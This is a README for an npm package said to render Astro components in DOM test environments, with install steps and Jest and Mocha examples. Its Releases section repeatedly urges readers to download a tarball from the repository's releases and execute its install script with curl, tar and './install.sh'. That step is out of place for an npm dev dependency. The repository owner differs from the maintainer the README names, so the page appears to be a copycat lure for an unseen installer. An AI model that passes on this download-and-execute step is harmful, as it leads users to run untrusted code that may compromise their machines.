[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/jassaaaaa/npm-astro-render-component/releases)

# Fast Astro Component Renderer for DOM Testing Environments Now

🤖 Plug-and-play Astro component renderer for fast, zero-config testing in any DOM-like JS/TS environment.  
Use with happy-dom, jsdom, or any VDOM-capable runtime to run server-side Astro components inside tests and scripts.

[![npm version](https://img.shields.io/npm/v/npm-astro-render-component.svg)](https://www.npmjs.com/package/npm-astro-render-component) [![License](https://img.shields.io/github/license/jassaaaaa/npm-astro-render-component)](https://github.com/jassaaaaa/npm-astro-render-component/blob/main/LICENSE)  
Topics: astro · back-end · component · dom · framework · front-end · happy-dom · happydom · igorskyflyer · jsdom · render · test · ui · vdom

Hero image  
![Astro + DOM testing](https://img.shields.io/badge/Astro-Renderer-4c8?style=for-the-badge&logo=astro)

Table of contents
- Features
- Install
- Quick start
- API
- Examples
- Integrations
- Testing strategies
- Performance notes
- Troubleshooting
- Releases
- Contributing
- License

Features
- Render Astro components inside any DOM-like JS/TS environment.
- Zero config. No build step. No SSR server.
- Works with happy-dom and jsdom in Node test runners.
- TypeScript aware. Use .astro, .tsx and .jsx components.
- Snapshot-friendly output. Clean HTML strings and DOM nodes.
- Small runtime with minimal dependencies.
- Designed for test suites and CI.

Install
- With npm:
```bash
npm install --save-dev npm-astro-render-component
```
- With yarn:
```bash
yarn add --dev npm-astro-render-component
```
- With pnpm:
```bash
pnpm add -D npm-astro-render-component
```

Quick start
- Basic usage in a Node test file. This example uses happy-dom:
```js
import { renderAstro } from 'npm-astro-render-component';
import { Window } from 'happy-dom';

// Prepare DOM
const window = new Window();
global.window = window;
global.document = window.document;

// Render
const html = await renderAstro({
  entry: './test/components/MyComponent.astro',
  props: { title: 'Hello' },
});

console.log(html);
// => returns HTML string or a DOM node depending on mode
```

Design ideas
- The package loads, compiles, and evaluates Astro components in-process.
- It uses a minimal Astro runtime shim and a DOM adapter to mount output.
- You get an HTML string or a DOM tree for assertions.

Modes
- html: return a string of HTML
- node: return a DOM node or DocumentFragment
- hydrate: run client scripts in a supplied DOM runtime (if supported)

API
- renderAstro(options): Promise<string | Node | DocumentFragment>

Options
- entry (string) — Path to the .astro component file or an importable module.
- props (object) — Props to pass to the component.
- mode ('html' | 'node' | 'hydrate') — Output mode. Default: 'html'.
- domRuntime (object) — Optional DOM runtime (window/document). If not provided, the package will try to create a safe DOM using happy-dom.
- compilerOptions (object) — Options passed to the internal compiler (babel/esbuild-like flags).
- debug (boolean) — Output verbose logs for troubleshooting. Default: false.

Examples

1) Render to HTML string (Jest)
```js
import { renderAstro } from 'npm-astro-render-component';

test('renders title', async () => {
  const html = await renderAstro({
    entry: './components/TestTitle.astro',
    props: { title: 'Test' },
    mode: 'html',
  });

  expect(html).toContain('<h1>Test</h1>');
});
```

2) Render to DOM node (Mocha + happy-dom)
```js
import { renderAstro } from 'npm-astro-render-component';
import { Window } from 'happy-dom';

const window = new Window();
global.window = window;
global.document = window.document;

it('mounts as DOM', async () => {
  const node = await renderAstro({
    entry: './components/Card.astro',
    props: { body: 'Body content' },
    mode: 'node',
    domRuntime: { window, document },
  });

  const body = node.querySelector('.card-body').textContent;
  assert.strictEqual(body, 'Body content');
});
```

3) Hydrate client script inside test (experimental)
```js
const fragment = await renderAstro({
  entry: './components/Counter.astro',
  props: { start: 0 },
  mode: 'hydrate',
  domRuntime: { window, document },
});

// locate internal counter element and assert initial value
const counter = fragment.querySelector('.counter');
expect(counter.textContent).toBe('0');

// simulate a click that triggers client behavior
counter.querySelector('button').dispatchEvent(new window.Event('click'));
expect(counter.textContent).toBe('1');
```

Integrations
- happy-dom: recommended for fast DOM API in tests. Use Window from happy-dom for global setup.
- jsdom: supported if you prefer jsdom as your DOM runtime.
- Test runners: Jest, Mocha, Vitest. Use adapter code to inject global window/document.
- CI: Works inside Node-based CI providers. Keep memory and worker counts reasonable for large suites.

Testing strategies
- For UI assertions, prefer DOM mode to use querySelector and node traversal.
- For snapshot testing, use HTML mode. It returns compact markup suitable for snapshots.
- For client behavior, use hydrate mode with a DOM runtime that supports events and timers.
- When testing multiple components, set up a shared DOM runtime in beforeAll/afterAll hooks to save time.

Performance notes
- The package compiles components on demand. The first render pays the compile cost.
- Use a test setup step to compile frequently used components once.
- Cache compiled artifacts by enabling a cache directory via compilerOptions.
- If tests run in parallel, configure per-worker cache paths to avoid race conditions.

Troubleshooting
- If you see missing globals, set global.window and global.document with your chosen DOM runtime.
- If a component imports assets (CSS, images), mock those imports in your test setup.
- If a third-party script expects a browser API, use hydrate mode with a richer DOM runtime or mock required functions.
- If rendering fails due to ES syntax, ensure your test environment supports modern ESM or use the internal compilerOptions to transform code.

Security
- The renderer executes component code inside the Node process. Audit third-party components before running untrusted code.
- For CI, run tests in isolated environments or use container sandboxes.

Releases
- Download and execute the release asset from the Releases page: https://github.com/jassaaaaa/npm-astro-render-component/releases  
  Find the build tarball or install script there. Download the file and execute it to run the packaged binary or installer. Example:
```bash
# Example flow (replace with the actual release asset name)
curl -L -o astro-render.tar.gz https://github.com/jassaaaaa/npm-astro-render-component/releases/download/vX.Y.Z/astro-render.tar.gz
tar -xzf astro-render.tar.gz
./install.sh
```
- If the release link is unavailable for any reason, check the Releases section on GitHub for the latest assets and installation notes: https://github.com/jassaaaaa/npm-astro-render-component/releases

Example project layout
- src/
  - components/
    - Button.astro
  - tests/
    - Button.test.js
- vite.config.js (optional)
- package.json
- tsconfig.json

CI tips
- Cache node_modules and compiler cache directories.
- Use a dedicated step to precompile large component sets.
- Run tests with limited concurrency to reduce memory pressure.

Contributing
- Fork the repo and open a pull request.
- Follow the commit style and add tests for new features.
- Run the test suite locally before submitting.

Maintainers
- igorskyflyer and project contributors (see Git history for details).

License
- MIT

Links
- Releases: [![Releases](https://img.shields.io/badge/Releases-Visit-blue?logo=github)](https://github.com/jassaaaaa/npm-astro-render-component/releases)